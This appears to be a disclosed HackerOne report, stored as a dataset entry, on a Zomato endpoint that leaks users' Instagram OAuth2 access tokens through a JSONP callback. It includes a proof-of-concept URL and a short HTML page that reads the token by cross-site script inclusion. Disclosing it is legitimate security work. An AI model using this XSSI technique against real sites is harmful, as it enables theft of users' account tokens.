---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '138270'
original_report_id: '138270'
title: Instagram OAuth2 Implementation Leaks Access Token; Allows for Cross-Site Script
  Inclusion (XSSI)
weakness: Information Disclosure
team_handle: zomato
created_at: '2016-05-12T12:11:56.128Z'
disclosed_at: '2016-06-22T11:33:44.588Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- information-disclosure
---

# Instagram OAuth2 Implementation Leaks Access Token; Allows for Cross-Site Script Inclusion (XSSI)

## Metadata

- HackerOne Report ID: 138270
- Weakness: Information Disclosure
- Program: zomato
- Disclosed At: 2016-06-22T11:33:44.588Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Once a user connects his Zomato account to Instagram (via OAuth2), the page `https://www.zomato.com/php/instagram_tag_relay` leaks the Instagram OAuth2 Access Token issued to Zomato:

PoC:
`https://www.zomato.com/php/instagram_tag_relay?callback=aaabc`

Result (personal data x'ed):
```
HTTP/1.1 200 OK
[...]
Content-Type: text/html; charset=UTF-8
[...]
aaabc({"data":[],"relay_summary":{"fresh_img_request_ongoing":false,"new_imgs_fetched":true},"pagination":[],"tag":"zomato","user":{"user_id":"3184xxxx","access_token":"3184371440.87c9ab8.xxxxxxxxxxxxxxxxxxxx","username":"xxxxxxx","profile_picture":"https:\/\/igcdn-photos-e-a.akamaihd.net\/hphotos-ak-xft1\/t51.2885-19\/11906329_960xxxxxxxxxxxxx.jpg","email":"xxxxxx@example.org"},"request":{"callback":"aaabc"}})
```

This is the result of a _**design issue**_: Zomato is using the OAuth2 Server-Side Flow where an Authorization Code is exchanged for an Access Token. The exchange happens server-side; there should be no need to later expose the Access Token to the end-user as it significantly increases the risk of Access Token leakage.

Due to a _**separate vulnerability**_, gaining access to this Access Token becomes indeed quite easy. An attacker might craft an HTML page, embed the vulnerable page as a script and receive the page content at the function referenced via the `callback` parameter. 

PoC:
```
<html>
<script>
function aaabc(s)
{
alert(JSON.stringify(s));
}
</script>

<script src="https://www.zomato.com/php/instagram_tag_relay?callback=aaabc"></script>

</html>
```

Result: 
F93245 

Please note these are actually two separate issues: 
1. The OAuth2 Access Token should not be exposed to the end-user in the first place. 
2. XSSI / Cross-Site Script Inclusion: sensitive data should not be made accessible in a way that allows it to be processed by a potentially malicious web page.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
